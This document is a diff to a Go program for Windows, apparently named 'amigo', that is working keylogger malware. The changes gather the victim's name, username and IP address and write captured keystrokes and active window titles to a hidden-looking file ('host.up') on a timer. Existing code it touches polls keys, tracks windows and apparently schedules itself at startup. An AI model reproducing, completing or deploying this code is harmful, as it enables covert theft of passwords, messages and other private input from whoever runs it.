@@ -1,19 +1,19 @@
 package main
 
 import (
-	"fmt"
 	"log"
-	"math"
 	"net"
+	"os"
 	"os/exec"
 	"os/user"
-	"strconv"
 	"syscall"
 	"time"
 	"unsafe"
 
 	"github.com/gios/amigo/constants"
 )
+
+const logFile = "./host.up"
 
 var (
 	user32   = syscall.NewLazyDLL("user32.dll")
@@ -31,11 +31,24 @@ var (
 
 	procGetSystemWindowsDirectory = kernel32.NewProc("GetSystemWindowsDirectoryA")
 
-	tmpTitle string
+	tmpTitle       string
+	eventsBuf      string
+	systemInfoData systemInfo
 )
+
+type systemInfo struct {
+	windowsFolder string
+	userName      string
+	userUsername  string
+	localIP       net.IP
+}
 
 var tmpKeylog = make(chan string)
 var tmpWindow = make(chan string)
+
+func (si *systemInfo) String() string {
+	return "(log " + si.userName + " " + si.userUsername + " " + si.localIP.String() + ")" + "\r\n"
+}
 
 // User32.dll
 
@@ -154,6 +167,60 @@ func getSystemWindowsDirectory(lpBuffer *byte) (len int32, err error) {
 	return
 }
 
+func fileInterval() {
+	writeTicker := time.NewTicker(10 * time.Second)
+	dateTicker := time.NewTicker(1 * time.Minute)
+
+	go func() {
+		for {
+			select {
+			case <-writeTicker.C:
+				writeLogFile(eventsBuf)
+				eventsBuf = ""
+			case <-dateTicker.C:
+				writeLogFile("(log " + time.Now().Format("2006-01-02 15:04:05") + ")")
+			}
+		}
+	}()
+}
+
+func writeLogFile(data string) {
+	file, openFileErr := os.OpenFile(logFile, os.O_APPEND|os.O_WRONLY, 0777)
+	if openFileErr != nil {
+		log.Fatalf("writeLogFile -> %v", openFileErr)
+	}
+
+	defer file.Close()
+
+	if _, writeStringErr := file.WriteString(data); writeStringErr != nil {
+		log.Fatalf("writeLogFile -> %v", writeStringErr)
+	}
+}
+
+func createLogFile() {
+	if _, statErr := os.Stat(logFile); os.IsNotExist(statErr) {
+		file, createErr := os.Create(logFile)
+		if createErr != nil {
+			log.Fatalf("createLogFile -> %v", createErr)
+		}
+
+		defer file.Close()
+		file.WriteString(systemInfoData.String())
+	}
+}
+
+func getOutboundIP() net.IP {
+	conn, err := net.Dial("udp", "8.8.8.8:80")
+	if err != nil {
+		log.Fatalf("getOutboundIP -> %v", err)
+	}
+	defer conn.Close()
+
+	localAddr := conn.LocalAddr().(*net.UDPAddr)
+
+	return localAddr.IP
+}
+
 func getSystemInfo() {
 	windowsDirectory := make([]byte, 256)
 	_, getWindowsDirectoryErr := getSystemWindowsDirectory(&windowsDirectory[0])
@@ -166,14 +233,12 @@ func getSystemInfo() {
 		log.Fatalf("user.Current() -> %v", userErr)
 	}
 
-	interfaceAddrs, interfaceAddrsErr := net.InterfaceAddrs()
-	if interfaceAddrsErr != nil {
-		log.Fatalf("net.InterfaceAddrs() -> %v", interfaceAddrsErr)
+	systemInfoData = systemInfo{
+		windowsFolder: string(windowsDirectory),
+		userName:      user.Name,
+		userUsername:  user.Username,
+		localIP:       getOutboundIP(),
 	}
-
-	fmt.Println("Windows Folder ", string(windowsDirectory))
-	fmt.Println("User Name ", user.Name, user.Username)
-	fmt.Println("Adapter ", interfaceAddrs)
 }
 
 func windowLogger() {
@@ -193,7 +258,7 @@ func windowLogger() {
 	}
 }
 
-func getLanguage() (syscall.Handle, int) {
+func getLanguage() syscall.Handle {
 	foregroundWindow, getForegroundWindowErr := getForegroundWindow()
 	if getForegroundWindowErr != nil {
 		log.Fatalf("getForegroundWindow -> %v", getForegroundWindowErr)
@@ -208,14 +273,7 @@ func getLanguage() (syscall.Handle, int) {
 		log.Fatalf("getKeyboardLayout -> %v", getKeyboardLayoutErr)
 	}
 
-	languageCode := int64(hkl) & int64(math.Pow(2, 16)-1)
-	languageID, languageCodeErr := strconv.Atoi(strconv.FormatInt(languageCode, 16))
-
-	if languageCodeErr != nil {
-		log.Fatalf("languageCodeErr -> %v", languageCodeErr)
-	}
-
-	return hkl, languageID
+	return hkl
 }
 
 func getUnicodeKey(virtualCode int) string {
@@ -231,7 +289,7 @@ func getUnicodeKey(virtualCode int) string {
 		log.Fatalf("mapVirtualKey -> %v", mapVirtualKeyErr)
 	}
 
-	hkl, _ := getLanguage()
+	hkl := getLanguage()
 	activateKeyboardLayout(hkl)
 
 	unicodeBuf := make([]uint16, 256)
@@ -248,138 +306,79 @@ func keyLogger() {
 				continue
 			}
 			switch Key {
-			case constants.VK_LBUTTON:
-				tmpKeylog <- "[LeftMouse]"
-			case constants.VK_RBUTTON:
-				tmpKeylog <- "[RightMouse]"
-			case constants.VK_MBUTTON:
-				tmpKeylog <- "[MiddleMouse]"
-			case constants.VK_BACK:
-				tmpKeylog <- "[Back]"
-			case constants.VK_TAB:
-				tmpKeylog <- "[Tab]"
 			case constants.VK_RETURN:
-				tmpKeylog <- "[Enter]\r\n"
-			case constants.VK_SHIFT:
-				tmpKeylog <- "[Shift]"
-			case constants.VK_MENU:
-				tmpKeylog <- "[Alt]"
-			case constants.VK_CAPITAL:
-				tmpKeylog <- "[CapsLock]"
-			case constants.VK_ESCAPE:
-				tmpKeylog <- "[Esc]"
+				tmpKeylog <- "\r\n[Enter]\r\n"
 			case constants.VK_SPACE:
 				tmpKeylog <- " "
-			case constants.VK_PRIOR:
-				tmpKeylog <- "[PageUp]"
-			case constants.VK_NEXT:
-				tmpKeylog <- "[PageDown]"
-			case constants.VK_END:
-				tmpKeylog <- "[End]"
-			case constants.VK_HOME:
-				tmpKeylog <- "[Home]"
-			case constants.VK_LEFT:
-				tmpKeylog <- "[Left]"
-			case constants.VK_UP:
-				tmpKeylog <- "[Up]"
-			case constants.VK_RIGHT:
-				tmpKeylog <- "[Right]"
-			case constants.VK_DOWN:
-				tmpKeylog <- "[Down]"
-			case constants.VK_SELECT:
-				tmpKeylog <- "[Select]"
-			case constants.VK_PRINT:
-				tmpKeylog <- "[Print]"
-			case constants.VK_EXECUTE:
-				tmpKeylog <- "[Execute]"
-			case constants.VK_SNAPSHOT:
-				tmpKeylog <- "[PrintScreen]"
-			case constants.VK_INSERT:
-				tmpKeylog <- "[Insert]"
-			case constants.VK_DELETE:
-				tmpKeylog <- "[Delete]"
-			case constants.VK_HELP:
-				tmpKeylog <- "[Help]"
-			case constants.VK_LWIN:
-				tmpKeylog <- "[LeftWindows]"
-			case constants.VK_RWIN:
-				tmpKeylog <- "[RightWindows]"
-			case constants.VK_APPS:
-				tmpKeylog <- "[Applications]"
-			case constants.VK_SLEEP:
-				tmpKeylog <- "[Sleep]"
-			case constants.VK_NUMPAD0:
-				tmpKeylog <- "[Pad 0]"
-			case constants.VK_NUMPAD1:
-				tmpKeylog <- "[Pad 1]"
-			case constants.VK_NUMPAD2:
-				tmpKeylog <- "[Pad 2]"
-			case constants.VK_NUMPAD3:
-				tmpKeylog <- "[Pad 3]"
-			case constants.VK_NUMPAD4:
-				tmpKeylog <- "[Pad 4]"
-			case constants.VK_NUMPAD5:
-				tmpKeylog <- "[Pad 5]"
-			case constants.VK_NUMPAD6:
-				tmpKeylog <- "[Pad 6]"
-			case constants.VK_NUMPAD7:
-				tmpKeylog <- "[Pad 7]"
-			case constants.VK_NUMPAD8:
-				tmpKeylog <- "[Pad 8]"
-			case constants.VK_NUMPAD9:
-				tmpKeylog <- "[Pad 9]"
 			case constants.VK_MULTIPLY:
 				tmpKeylog <- "*"
 			case constants.VK_ADD:
 				tmpKeylog <- "+"
-			case constants.VK_SEPARATOR:
-				tmpKeylog <- "[Separator]"
 			case constants.VK_SUBTRACT:
 				tmpKeylog <- "-"
 			case constants.VK_DECIMAL:
 				tmpKeylog <- "."
+			case constants.VK_LBUTTON:
+			case constants.VK_RBUTTON:
+			case constants.VK_MBUTTON:
+			case constants.VK_BACK:
+			case constants.VK_TAB:
+			case constants.VK_SHIFT:
+			case constants.VK_MENU:
+			case constants.VK_CAPITAL:
+			case constants.VK_ESCAPE:
+			case constants.VK_PRIOR:
+			case constants.VK_NEXT:
+			case constants.VK_END:
+			case constants.VK_HOME:
+			case constants.VK_LEFT:
+			case constants.VK_UP:
+			case constants.VK_RIGHT:
+			case constants.VK_DOWN:
+			case constants.VK_SELECT:
+			case constants.VK_PRINT:
+			case constants.VK_EXECUTE:
+			case constants.VK_SNAPSHOT:
+			case constants.VK_INSERT:
+			case constants.VK_DELETE:
+			case constants.VK_HELP:
+			case constants.VK_LWIN:
+			case constants.VK_RWIN:
+			case constants.VK_APPS:
+			case constants.VK_SLEEP:
+			case constants.VK_NUMPAD0:
+			case constants.VK_NUMPAD1:
+			case constants.VK_NUMPAD2:
+			case constants.VK_NUMPAD3:
+			case constants.VK_NUMPAD4:
+			case constants.VK_NUMPAD5:
+			case constants.VK_NUMPAD6:
+			case constants.VK_NUMPAD7:
+			case constants.VK_NUMPAD8:
+			case constants.VK_NUMPAD9:
+			case constants.VK_SEPARATOR:
 			case constants.VK_DIVIDE:
-				tmpKeylog <- "[Devide]"
 			case constants.VK_F1:
-				tmpKeylog <- "[F1]"
 			case constants.VK_F2:
-				tmpKeylog <- "[F2]"
 			case constants.VK_F3:
-				tmpKeylog <- "[F3]"
 			case constants.VK_F4:
-				tmpKeylog <- "[F4]"
 			case constants.VK_F5:
-				tmpKeylog <- "[F5]"
 			case constants.VK_F6:
-				tmpKeylog <- "[F6]"
 			case constants.VK_F7:
-				tmpKeylog <- "[F7]"
 			case constants.VK_F8:
-				tmpKeylog <- "[F8]"
 			case constants.VK_F9:
-				tmpKeylog <- "[F9]"
 			case constants.VK_F10:
-				tmpKeylog <- "[F10]"
 			case constants.VK_F11:
-				tmpKeylog <- "[F11]"
 			case constants.VK_F12:
-				tmpKeylog <- "[F12]"
 			case constants.VK_NUMLOCK:
-				tmpKeylog <- "[NumLock]"
 			case constants.VK_SCROLL:
-				tmpKeylog <- "[ScrollLock]"
 			case constants.VK_LSHIFT:
-				tmpKeylog <- "[LeftShift]"
 			case constants.VK_RSHIFT:
-				tmpKeylog <- "[RightShift]"
 			case constants.VK_LCONTROL:
-				tmpKeylog <- "[LeftCtrl]"
 			case constants.VK_RCONTROL:
-				tmpKeylog <- "[RightCtrl]"
 			case constants.VK_LMENU:
-				tmpKeylog <- "[LeftMenu]"
 			case constants.VK_RMENU:
-				tmpKeylog <- "[RightMenu]"
+				tmpKeylog <- ""
 			default:
 				getLanguage()
 				unicodeKey := getUnicodeKey(Key)
@@ -394,9 +393,9 @@ func keyLoggerListener() {
 		time.Sleep(1 * time.Millisecond)
 		select {
 		case key := <-tmpKeylog:
-			log.Println("KEY: ", key)
+			eventsBuf = eventsBuf + key
 		case window := <-tmpWindow:
-			log.Println("WINDOW: ", window)
+			eventsBuf = eventsBuf + "\r\n" + window + "\r\n"
 		default:
 		}
 	}
@@ -423,6 +422,8 @@ func main() {
 	log.Println("Starting...")
 	addScheduler()
 	getSystemInfo()
+	createLogFile()
+	go fileInterval()
 	go keyLogger()
 	go windowLogger()
 	go keyLoggerListener()
